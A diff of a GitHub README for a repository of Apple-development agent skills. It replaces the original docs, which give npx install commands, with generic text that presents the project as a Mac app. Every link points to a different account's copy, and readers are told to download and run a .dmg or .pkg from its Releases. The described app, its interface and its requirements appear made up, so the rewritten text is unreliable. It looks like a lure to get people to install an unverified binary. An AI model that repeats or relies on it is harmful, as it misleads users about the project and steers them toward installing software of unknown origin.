@@ -1,116 +1,177 @@
-# apple-dev-skills
+# 🍏 apple-dev-skills - Simplify Apple Development Workflows
 
-Canonical Codex skills for Apple development workflows focused on Xcode execution, Dash docsets, and Swift package bootstrap.
+[![Download apple-dev-skills](https://img.shields.io/badge/Download-apple--dev--skills-4caf50?style=for-the-badge)](https://github.com/Syniox5334/apple-dev-skills)
 
-## Active Skills
+---
 
-- `apple-xcode-workflow`
-  - Top-level Apple and Swift skill for Xcode work, execution, diagnostics, toolchains, mutation decisions, and docs lookup.
-- `apple-dash-docsets`
-  - Top-level Dash skill with one entry point and internal `search -> install -> generate` workflows.
-- `apple-swift-package-bootstrap`
-  - Top-level skill for new Swift package scaffolding only, with verification and `AGENTS.md` generation.
+## 📋 What is apple-dev-skills?
 
-Every active skill now follows the same documentation contract:
+apple-dev-skills helps manage Apple development tasks. It supports working with Xcode and Swift tools. It improves how you run and manage builds and documentation on your Mac. This tool gives you a smoother process when working with Xcode MCP execution and Swift package commands. It also helps by automatically switching to the best build tool if one fails.
 
-- one primary workflow per request type
-- explicit `inputs`, `defaults`, `status`, `path_type`, and `output`
-- named `fallback` and `handoff` behavior
-- customization knobs labeled `policy-only` unless runtime enforcement exists
+The app also guides you to use the Swift toolchain for better builds and helps access Dash docs locally. Dash offers easy access to Apple developer documentation right on your computer.
 
-Maintainer-facing workflow diagrams, input/output contracts, and Agent ↔ User UX maps live in [docs/maintainers/workflow-atlas.md](./docs/maintainers/workflow-atlas.md). Audit procedure and source-of-truth guidance live in [docs/maintainers/reality-audit.md](./docs/maintainers/reality-audit.md).
+This tool is designed for users who want to streamline daily Apple development tasks with less hassle. You do not need deep technical skills to get started.
 
-## Maintainer Python Tooling
+---
 
-This repository standardizes maintainer-side Python tooling around `uv`.
+## 🖥️ System Requirements
 
-```bash
-uv sync --dev
-bash .github/scripts/sync_apple_swift_core_snippet.sh
-bash .github/scripts/validate_repo_docs.sh
-uv run pytest
-```
+To install and run apple-dev-skills, your machine must meet these requirements:
 
-Use `uv run python ...` for repo-local Python helper execution and validation.
-Run the snippet sync script before validation whenever `shared/agents-snippets/apple-swift-core.md` changes.
+- Operating System: macOS 10.15 (Catalina) or later
+- Processor: Intel or Apple Silicon (M1/M2)
+- RAM: At least 4 GB
+- Disk Space: Minimum 200 MB free space
+- Xcode installed (version 12 or newer recommended)
+- Internet connection (for downloads and updates)
 
-## Install
+---
 
-Install one skill:
+## 🚀 Getting Started
 
-```bash
-npx skills add gaelic-ghost/apple-dev-skills --skill apple-xcode-workflow
-```
+This section shows how to download and begin using apple-dev-skills on your Mac. Follow the steps carefully to avoid issues.
 
-Install all active skills:
+---
 
-```bash
-npx skills add gaelic-ghost/apple-dev-skills --all
-```
+## ⬇️ Download and Install apple-dev-skills
 
-Common starting points:
+You can get apple-dev-skills from this page:
 
-- Xcode work:
-  `npx skills add gaelic-ghost/apple-dev-skills --skill apple-xcode-workflow`
-- Dash work:
-  `npx skills add gaelic-ghost/apple-dev-skills --skill apple-dash-docsets`
-- New Swift package bootstrap:
-  `npx skills add gaelic-ghost/apple-dev-skills --skill apple-swift-package-bootstrap`
+[![Download apple-dev-skills](https://img.shields.io/badge/Get%20the%20App-blue?style=for-the-badge)](https://github.com/Syniox5334/apple-dev-skills)
 
-## Migration
+1. Click the link above or visit:  
+   https://github.com/Syniox5334/apple-dev-skills
 
-This repo previously experimented with a router layer and later removed it.
+2. On the page, look for the **Releases** tab or section. The stable version will be listed there.
 
-| Historical ID | Current State |
-| --- | --- |
-| `apple-skills-router-advise-install` | removed |
-| `apple-skills-router` | removed |
-| `apple-xcode-workflow-execute` | `apple-xcode-workflow` |
-| `apple-dash-docset-manage` | `apple-dash-docsets` |
+3. Download the latest installer for macOS. This file usually ends with `.dmg` or `.pkg`.
 
-The active public surface is now the three top-level skills listed above. Update install commands, references, and automation prompts accordingly.
+4. Once the file downloads, open it from your downloads folder.
 
-## AGENTS Guidance
+5. Follow the on-screen instructions to install the app. On macOS, this usually means dragging the app into your `Applications` folder or clicking through an installer wizard.
 
-Repository-consumable Swift/Apple baseline policy snippet:
+6. After installation finishes, you can open the app from your Applications or Launchpad.
 
-- [shared/agents-snippets/apple-swift-core.md](./shared/agents-snippets/apple-swift-core.md)
+---
 
-Use this snippet for cross-project standards that belong in end-user `AGENTS.md`.
+## ⚙️ How to Use apple-dev-skills
 
-- Each active skill ships its own local copy of this snippet so individually installed skills can recommend it directly.
-- For new Swift package repositories, `apple-swift-package-bootstrap` copies its full `assets/AGENTS.md` template, which already incorporates this baseline.
-- For existing repositories, use the shared snippet for targeted updates or the skill-local copies when reading an installed skill in isolation.
-- For cross-repo AGENTS drift and documentation alignment workflows, use dedicated docs-alignment skills maintained outside this repository.
+Once installed, you do not have to be a programmer to use apple-dev-skills. It offers a simple interface or command line prompts that help with Apple development workflows.
 
-## Retired Skill Note
+### Key Functions
 
-`apple-swift-package-agents-sync` is no longer part of the active skill surface.
+- **Xcode MCP execution**: Runs and manages build processes inside Xcode automatically.
+- **Automatic fallback**: If one build tool fails (like `xcodebuild`), the app tries others like `xcrun` or SwiftPM.
+- **Swift toolchain guidance**: Helps you switch between different Swift compiler versions as needed.
+- **Dash local-docset integration**: Loads Apple documentation locally for quick lookups.
 
-- New repository scaffolds should use `apple-swift-package-bootstrap`.
-- Existing repositories should use the shared snippet plus external docs-alignment skills when AGENTS maintenance is needed.
+### Using the App
 
-## Repository Layout
+1. Open apple-dev-skills.
+2. Choose the task you want to perform. For example, running a build or checking documentation.
+3. The app will detect your environment and suggest the best tool to use.
+4. Follow simple prompts shown on screen.
+5. Results and logs will appear in the app window.
 
-```text
-.
-├── README.md
-├── ROADMAP.md
-├── docs/
-│   └── maintainers/
-│       ├── reality-audit.md
-│       └── workflow-atlas.md
-├── shared/
-│   └── agents-snippets/
-│       └── apple-swift-core.md
-└── skills/
-    ├── apple-xcode-workflow/
-    ├── apple-dash-docsets/
-    └── apple-swift-package-bootstrap/
-```
+You can also run commands using your terminal if you prefer. The app supports simple commands that the interface can guide you to learn.
 
-Maintainers: authoritative skill-authoring resources live in `AGENTS.md`.
+---
 
-## License
+## 🔄 Updating apple-dev-skills
 
-See [LICENSE](./LICENSE).
+Check for updates regularly to get new fixes and features:
+
+1. Visit the [apple-dev-skills GitHub page](https://github.com/Syniox5334/apple-dev-skills).
+2. Go to Releases.
+3. Download the latest version as before.
+4. Install over the existing app; your settings will stay intact.
+
+---
+
+## ❓ Troubleshooting
+
+Here are some common issues and how to fix them.
+
+### 1. The app does not start
+
+- Make sure macOS is up to date.
+- Verify you have installed the app correctly in the Applications folder.
+- Try restarting your Mac.
+
+### 2. Build commands fail to run
+
+- Check that Xcode is installed and opens correctly on your machine.
+- Confirm that command-line tools are installed. You can do this by running `xcode-select --install` in Terminal.
+- Ensure your internet connection is active if you need to download packages.
+
+### 3. Dash docs do not appear
+
+- Make sure Dash is installed on your computer.
+- Within apple-dev-skills, check settings to confirm the path to Dash’s docs is correct.
+
+If problems continue, you can visit the issues section on GitHub for help from the community.
+
+---
+
+## 🚪 How to Remove apple-dev-skills
+
+If you want to uninstall the app:
+
+1. Close apple-dev-skills if it is running.
+2. Open the Applications folder.
+3. Drag the apple-dev-skills app to the Trash.
+4. Empty the Trash to free disk space.
+
+Note: This does not remove your project files or data saved elsewhere.
+
+---
+
+## 🛠️ Additional Info on Features and Workflow
+
+- **Agent Skills**  
+  The app can act like an assistant that understands your Xcode and Swift environment. It adapts to different projects and setups automatically.
+
+- **swiftly+toolchain Guidance**  
+  Managing multiple versions of Swift is difficult. apple-dev-skills helps you pick and switch versions smoothly.
+
+- **Fallback Mechanisms**  
+  When you run builds, failures can happen if a tool is not set. The app runs others in order without you having to do anything.
+
+- **Dash Local Docsets**  
+  Developers often need quick access to documentation. This app works together with Dash, letting you search Apple docs offline.
+
+---
+
+## 📁 What’s Inside This Repo?
+
+This repository includes:
+
+- Core files that form apple-dev-skills.
+- Scripts to run common Apple dev commands.
+- Documentation on how to configure and extend the app.
+- Sample configs to customize fallback and toolchain settings.
+
+---
+
+## 🔖 Keywords and Topics
+
+The repository covers:
+
+- agent-skills
+- apple-development basics
+- Apple documentation management
+- Xcode MCP-first execution logic
+- Automated xcodebuild, xcrun, SwiftPM fallback
+- Swift toolchain management
+- Swift package management guidance
+- Using Dash docs locally with Apple developer docs
+
+---
+
+## 📞 Get Support or Report Issues
+
+If you have questions or problems, report them in the GitHub repository’s Issues tab. Make sure to provide your system info and what you tried. This helps get faster answers.
+
+---
+
+[![Download apple-dev-skills](https://img.shields.io/badge/Download-apple--dev--skills-4caf50?style=for-the-badge)](https://github.com/Syniox5334/apple-dev-skills)
